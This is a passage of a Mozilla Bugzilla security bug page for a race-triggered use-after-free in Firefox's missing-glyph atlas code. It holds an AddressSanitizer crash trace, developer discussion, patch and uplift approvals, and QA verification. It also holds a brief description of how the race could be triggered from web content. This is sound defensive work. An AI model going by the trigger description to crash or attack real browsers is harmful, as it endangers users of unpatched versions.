    #10 0x7ff9bfb5c22f in mozilla::dom::WorkerPrivate::Constructor /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:2652
    #11 0x7ff9bfb19624 in mozilla::dom::Worker::Constructor /builds/worker/checkouts/gecko/dom/workers/Worker.cpp:43
    #12 0x7ff9bb9ded46 in mozilla::dom::Worker_Binding::_constructor /builds/worker/workspace/obj-build/dom/bindings/WorkerBinding.cpp:1173
    #13 0x7ff9c73bdaa0 in InternalConstruct /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:700
    #14 0x7ff9c73a5c88 in Interpret /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:3353
    #15 0x7ff9c7391506 in js::RunScript /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:431
    #16 0x7ff9c73bf07a in js::ExecuteKernel /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:818
    #17 0x7ff9c73bf4b0 in js::Execute /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:850
    #18 0x7ff9c57fd0fa in JS_ExecuteScript /builds/worker/checkouts/gecko/js/src/vm/CompilationAndEvaluation.cpp:496
    #19 0x7ff9b9d0a167 in mozilla::dom::JSExecutionContext::ExecScript /builds/worker/checkouts/gecko/dom/base/JSExecutionContext.cpp:241
    #20 0x7ff9c01a10e7 in mozilla::dom::ScriptLoader::EvaluateScript /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:2403
    #21 0x7ff9c019f2f4 in mozilla::dom::ScriptLoader::EvaluateScriptElement /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:2207
    #22 0x7ff9c0195f15 in mozilla::dom::ScriptLoader::ProcessRequest /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:1857
    #23 0x7ff9c0191440 in mozilla::dom::ScriptLoader::ProcessInlineScript /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:1300
    #24 0x7ff9c017aec3 in mozilla::dom::ScriptLoader::ProcessScriptElement /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:927
    #25 0x7ff9c0179e26 in mozilla::dom::ScriptElement::MaybeProcessScript /builds/worker/checkouts/gecko/dom/script/ScriptElement.cpp:134
    #26 0x7ff9b87dd28d in nsHtml5TreeOpExecutor::RunScript /builds/worker/checkouts/gecko/parser/html/nsHtml5TreeOpExecutor.cpp:950
    #27 0x7ff9b87d7361 in nsHtml5TreeOpExecutor::RunFlushLoop /builds/worker/checkouts/gecko/parser/html/nsHtml5TreeOpExecutor.cpp:741
    #28 0x7ff9b87e4f90 in nsHtml5ExecutorFlusher::Run /builds/worker/checkouts/gecko/parser/html/nsHtml5StreamParser.cpp:174
    #29 0x7ff9b68217d6 in mozilla::SchedulerGroup::Runnable::Run /builds/worker/checkouts/gecko/xpcom/threads/SchedulerGroup.cpp:114
    #30 0x7ff9b6844c83 in mozilla::RunnableTask::Run /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:553
    #31 0x7ff9b682d38c in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:867
    #32 0x7ff9b68297f2 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:698
    #33 0x7ff9b682a413 in mozilla::TaskController::ProcessPendingMTTask /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:464
    #34 0x7ff9b68481c1 in mozilla::detail::RunnableFunction<`lambda at /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:188:7'>::Run /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:547
    #35 0x7ff9b687857a in nsThread::ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1239
    #36 0x7ff9b6887f5d in NS_ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:477
    #37 0x7ff9b7f30267 in mozilla::ipc::MessagePump::Run /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:85
    #38 0x7ff9b7e47432 in MessageLoop::RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:374
    #39 0x7ff9b7e47207 in MessageLoop::Run /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:356
    #40 0x7ff9c06ec81c in nsBaseAppShell::Run /builds/worker/checkouts/gecko/widget/nsBaseAppShell.cpp:148
    #41 0x7ff9c08f779e in nsAppShell::Run /builds/worker/checkouts/gecko/widget/windows/nsAppShell.cpp:614
    #42 0x7ff9c5377ff7 in XRE_RunAppShell /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:738
    #43 0x7ff9b7e47432 in MessageLoop::RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:374
    #44 0x7ff9b7e47207 in MessageLoop::Run /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:356
    #45 0x7ff9c537753a in XRE_InitChildProcess /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:673
    #46 0x7ff7e1632c9e in NS_internal_main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:353
    #47 0x7ff7e163166e in wmain /builds/worker/checkouts/gecko/toolkit/xre/nsWindowsWMain.cpp:167
    #48 0x7ff7e1725a67 in __scrt_common_main_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #49 0x7ffa5dc626bc in BaseThreadInitThunk+0x1c (C:\WINDOWS\System32\KERNEL32.DLL+0x1800126bc)
    #50 0x7ffa5ecca9f7 in RtlUserThreadStart+0x27 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18005a9f7)

SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/checkouts/gecko/gfx/2d/DrawTargetSkia.cpp:246 in mozilla::gfx::GetSkImageForSurface
Shadow bytes around the buggy address:
  0x04a6adbfd780: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x04a6adbfd790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x04a6adbfd7a0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x04a6adbfd7b0: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa
  0x04a6adbfd7c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x04a6adbfd7d0: fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd
  0x04a6adbfd7e0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x04a6adbfd7f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04a6adbfd800: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x04a6adbfd810: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x04a6adbfd820: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==18340==ABORTING

```

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a543_159069)• 2 years ago |

Group: core-security → gfx-core-security

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a6769_428608)• 2 years ago |

Flags: sec-bounty?

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a19326_406194)• 2 years ago |

Keywords: [csectype-race](/buglist.cgi?keywords=csectype-race&resolution=---)

|  | [Lee Salzman [:lsalzman]](/user_profile?user_id=536714) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1823365#c2)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1823365&comment_id=16337067 "1 revision") |
|  | |

Jonathan, ideas about how to make this thread-safe? Could we conceivably just disable missing glyphs on worker threads and side-step the issue?

Severity: -- → S3Flags: needinfo?(jfkthame)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1823365#c3)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1823365&comment_id=16337985 "1 revision") |
|  | |

(In reply to Lee Salzman [:lsalzman] from [comment #2](/show_bug.cgi?id=1823365#c2 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()"))

> Jonathan, ideas about how to make this thread-safe? Could we conceivably just disable missing glyphs on worker threads and side-step the issue?

I guess that'd be possible, though it seems generally bad for us to handle text rendering differently depending whether we're on a worker or the main thread.

Another option may be to consolidate the glyph-atlas globals into a single record, so we just have one global pointer to manage, and then ensure that whatever thread needs to use it can atomically take ownership of that record for the duration of its operation.

I've started to put together a patch to do the latter; let's see if it seems to work without too much pain.

Flags: needinfo?(jfkthame)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1823365#c4)• 2 years ago |
|  | |

How consistent is the test case at reproducing the issue? Generally I would guess that once-per-process races on a single assignment are hard to trigger, but maybe it is so easy to create two DOM workers at the same time that it is easy to hit.

Flags: needinfo?(loobenyang)

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1823365#c5)• 2 years ago |
|  | |

(In reply to Andrew McCreight [:mccr8] from [comment #4](/show_bug.cgi?id=1823365#c4 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()"))

> How consistent is the test case at reproducing the issue? Generally I would guess that once-per-process races on a single assignment are hard to trigger, but maybe it is so easy to create two DOM workers at the same time that it is easy to hit.

With this PoC on my Windows POC, it's reproduced almost instantly when I run it. If it does not hit, I only need to try one or a couple more times.

Flags: needinfo?(loobenyang)

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a214088_486634)• 2 years ago |

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1823365#c6)• 2 years ago |
|  | |

Attached file
[tsan.txt](attachment.cgi?id=9324553)
— [Details](attachment.cgi?id=9324553&action=edit)

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a214285_486634)• 2 years ago |

OS: Windows → AllHardware: Desktop → All

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1823365#c7)• 2 years ago |
|  | |

Tyson was able to reproduce it about half of the time, and also reproduce it on Linux. It is interesting to know that a once-per-process race can be triggered so easily sometimes. I suppose the time of the race in this case is very controllable from content. I'll have to keep that in mind in the future.

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a216186_406194)• 2 years ago |

Summary: GFX - Use After Free in MakeGlyphAtlas() → initialization race leading to use after free in MakeGlyphAtlas()

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a216404_486634)• 2 years ago |

Component: Graphics: Canvas2D → Graphics: Text

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1823365#c8)• 2 years ago |
|  | |

Attached file
[Bug 1823365 - Clean up management of missing-glyph atlas.](attachment.cgi?id=9324559)
— [Details](attachment.cgi?id=9324559&action=edit)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1823365#c9)• 2 years ago |
|  | |

Tyson, would you be able to try the above patch and let me know if this prevents the issue? I haven't reproduced it locally but if I'm understanding it right, I think this should resolve things. Thanks!

Flags: needinfo?(twsmith)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a219112_600971)• 2 years ago |

Assignee: nobody → jfkthameStatus: NEW → ASSIGNED

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1823365#c10)• 2 years ago |
|  | |

I am still able to reproduce the issue with the patch applied.

Flags: needinfo?(twsmith) → needinfo?(jfkthame)

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1823365#c11)• 2 years ago |
|  | |

Attached file
[tsan\_with\_patch.txt](attachment.cgi?id=9324576)
— [Details](attachment.cgi?id=9324576&action=edit)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1823365#c12)• 2 years ago |
|  | |

(In reply to Tyson Smith [:tsmith] from [comment #10](/show_bug.cgi?id=1823365#c10 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()"))

> I am still able to reproduce the issue with the patch applied.

Ah, drat. OK, thanks for testing - I'll take another look tomorrow.

Flags: needinfo?(jfkthame)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1823365#c13)• 2 years ago |
|  | |

Oh, wait - looking at your tsan traces, that's a *different* race than the missing-glyph atlas issue originally reported here. Needs a deeper look.....

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1823365#c14)• 2 years ago |
|  | |

Comment on [attachment 9324559](/attachment.cgi?id=9324559 "Bug 1823365 - Clean up management of missing-glyph atlas.") [[details]](/attachment.cgi?id=9324559&action=edit "Bug 1823365 - Clean up management of missing-glyph atlas.")

[Bug 1823365](/show_bug.cgi?id=1823365 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()") - Clean up management of missing-glyph atlas.

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: The patch introduces an atomic, which implies we're concerned about a race/threading issue; and it's in the missing-glyph code, which points to rendering text that contains invalid Unicode values. So it's not a big stretch to get from there to running multiple canvas workers that paint "garbage" characters.

It's unclear to me how one would get beyond a UAF-caused crash (or maybe scrambled rendering) to something actually exploitable, but maybe people more experienced in such things would find a way.

* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: 105 onwards
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Should transplant cleanly AFAICS.
* **How likely is this patch to cause regressions; how much testing does it need?**: Low risk, fairly simple refactoring to avoid use of several global variables.
* **Is Android affected?**: No
[Attachment #9324559](/attachment.cgi?id=9324559&action=edit "Bug 1823365 - Clean up management of missing-glyph atlas.") -
Flags: sec-approval?

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1823365#c15)• 2 years ago |
|  | |

The severity field for this bug is set to S3. However, the bug is flagged with the `sec-high` keyword.

:jfkthame, could you consider increasing the severity of this security bug?

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#severity_high_security.py).

Flags: needinfo?(jfkthame)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a273970_75935)• 2 years ago |

[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix)
[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=affected)
[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=unaffected)
[tracking-firefox112](/buglist.cgi?f1=cf_tracking_firefox112&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%2B)
[tracking-firefox113](/buglist.cgi?f1=cf_tracking_firefox113&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox113&o1=equals&v1=%2B)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1823365#c16)• 2 years ago |
|  | |

For what it is worth, I looked on crash stats and I didn't see any use-after-free crashes that looked similar.

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a286276_329583)• 2 years ago |

Blocks: [1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace")

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1823365#c17)• 2 years ago |
|  | |

FTR, I filed [bug 1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace") for the data race shown in comments 6 and 11, which is unrelated to the original glyph-atlas issue.

Flags: needinfo?(jfkthame)

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1823365#c18)• 2 years ago |
|  | |

The bug is marked as tracked for firefox112 (beta) and tracked for firefox113 (nightly). However, the bug still has low severity.

:bhood, could you please increase the severity for this tracked bug? If you disagree with the tracking decision, please talk with the release managers.

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#tracked_attention.py).

Flags: needinfo?(bhood)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1823365#c19)• 2 years ago |
|  | |

Comment on [attachment 9324559](/attachment.cgi?id=9324559 "Bug 1823365 - Clean up management of missing-glyph atlas.") [[details]](/attachment.cgi?id=9324559&action=edit "Bug 1823365 - Clean up management of missing-glyph atlas.")

[Bug 1823365](/show_bug.cgi?id=1823365 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()") - Clean up management of missing-glyph atlas.

Approved to land and uplift.

[Attachment #9324559](/attachment.cgi?id=9324559&action=edit "Bug 1823365 - Clean up management of missing-glyph atlas.") -
Flags: sec-approval? → sec-approval+

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1823365#c20)• 2 years ago |
|  | |

Attached file
[Bug 1823365 - Clean up management of missing-glyph atlas.](attachment.cgi?id=9324996)
— [Details](attachment.cgi?id=9324996&action=edit)

Original Revision: <https://phabricator.services.mozilla.com/D173360>

|  | [Bob Hood [:bhood]](/user_profile?user_id=697075) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a403271_697075)• 2 years ago |

Flags: needinfo?(bhood)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1823365#c21)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1823365&comment_id=16342045 "1 revision") |
|  | |

Clean up management of missing-glyph atlas. r=lsalzman

<https://hg.mozilla.org/integration/autoland/rev/193897194231ee21a6a6c4d926f82884b7463b33>

<https://hg.mozilla.org/mozilla-central/rev/193897194231>

Group: gfx-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 2 years ago
[status-firefox113](/buglist.cgi?f1=cf_status_firefox113&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 113 Branch

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1823365#c22)• 2 years ago |
|  | |

Comment on [attachment 9324996](/attachment.cgi?id=9324996 "Bug 1823365 - Clean up management of missing-glyph atlas.") [[details]](/attachment.cgi?id=9324996&action=edit "Bug 1823365 - Clean up management of missing-glyph atlas.")

[Bug 1823365](/show_bug.cgi?id=1823365 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()") - Clean up management of missing-glyph atlas.

### Beta/Release Uplift Approval Request

* **User impact if declined**: Potential race/use-after-free/crash when rendering missing-glyph symbols
* **Is this code covered by automated tests?**: No
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: Yes
* **If yes, steps to reproduce**: Repeatedly load the testcase in the bug
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Just replaces several (racy) globals with an atomically-managed record
* **String changes made/needed**: none
* **Is Android affected?**: No
[Attachment #9324996](/attachment.cgi?id=9324996&action=edit "Bug 1823365 - Clean up management of missing-glyph atlas.") -
Flags: approval-mozilla-beta?

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a596433_329583)• 2 years ago |

Flags: qe-verify+

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a624006_406194)• 2 years ago |

[status-thunderbird\_esr102](/buglist.cgi?f1=cf_status_thunderbird_esr102&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr102&o1=equals&v1=fixed)
[status-thunderbird\_esr91](/buglist.cgi?f1=cf_status_thunderbird_esr91&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr91&o1=equals&v1=fixed)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a624449_75935)• 2 years ago |

[status-thunderbird\_esr102](/buglist.cgi?f1=cf_status_thunderbird_esr102&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_thunderbird_esr102&o1=equals&v1=fixed) → ---
[status-thunderbird\_esr91](/buglist.cgi?f1=cf_status_thunderbird_esr91&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_thunderbird_esr91&o1=equals&v1=fixed) → ---

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1823365#c24)• 2 years ago |
|  | |

Comment on [attachment 9324996](/attachment.cgi?id=9324996 "Bug 1823365 - Clean up management of missing-glyph atlas.") [[details]](/attachment.cgi?id=9324996&action=edit "Bug 1823365 - Clean up management of missing-glyph atlas.")

[Bug 1823365](/show_bug.cgi?id=1823365 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()") - Clean up management of missing-glyph atlas.

Approved for 112.0b8

[Attachment #9324996](/attachment.cgi?id=9324996&action=edit "Bug 1823365 - Clean up management of missing-glyph atlas.") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1823365#c25)• 2 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/9d1d6a19f319>

[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=fixed)

|  | [Mihai Boldan, Desktop QA [:mboldan]](/user_profile?user_id=551058) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a676219_551058)• 2 years ago |

QA Whiteboard: [qa-triaged]

|  | [Ciprian Georgiu, Desktop QA](/user_profile?user_id=576182) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1823365#c26)• 2 years ago |
|  | |

I'm not able to reproduce this crash using the test case from [comment 0](/show_bug.cgi?id=1823365#c0 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()"), with an affected Nightly asan build (2023-03-20). I've tested on Windows 10 and Ubuntu 18.04 x64.

Looben Yang, could you please help up verifying if the bug is fixed on latest [Nightly 113](https://archive.mozilla.org/pub/firefox/nightly/latest-mozilla-central/) and [Beta 112.0b8](https://archive.mozilla.org/pub/firefox/candidates/112.0b8-candidates/build1/)?

Flags: needinfo?(lsalzman)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1823365#c27)• 2 years ago |
|  | |

FWIW, I found the original testcase crashed pretty reliably for me on macOS with a normal release build. (But as it's a race condition, it may be unpredictable.)

|  | [Lee Salzman [:lsalzman]](/user_profile?user_id=536714) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a877068_536714)• 2 years ago |

Flags: needinfo?(lsalzman)

|  | [Ciprian Georgiu, Desktop QA](/user_profile?user_id=576182) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1823365#c28)• 2 years ago |
|  | |

Thanks, Jonathan! It crashed for me as well immediately on macOS 11 with a regular FF 111.0.1 build.

The crash is not reproducing anymore on latest Nightly 113.0a1 and Beta 112.0b9, under macOS 11.

Status: RESOLVED → VERIFIED
[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=verified)
[status-firefox113](/buglist.cgi?f1=cf_status_firefox113&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=verified)Flags: qe-verify+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a1325490_1689)• 2 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a1400007_578488)• 2 years ago |

Whiteboard: [adv-main112+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1823365#c29)• 2 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9327572)
— [Details](attachment.cgi?id=9327572&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a1589408_578488)• 2 years ago |

Alias: CVE-2023-29537

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a18293052_1689)• 1 year ago |

Group: core-security-release

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a25744279_329583)• 1 year ago |

Regressions: [1874324](/show_bug.cgi?id=1874324 "NEW - LeakSanitizer: detected memory leaks [@ MakeGlyphAtlas]")

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1823365#a37784821_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1823365&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Looben Yang](/user_profile?user_id=506912)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from bugzilla.mozilla.org_8e1e5bdb_20250115_090636.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

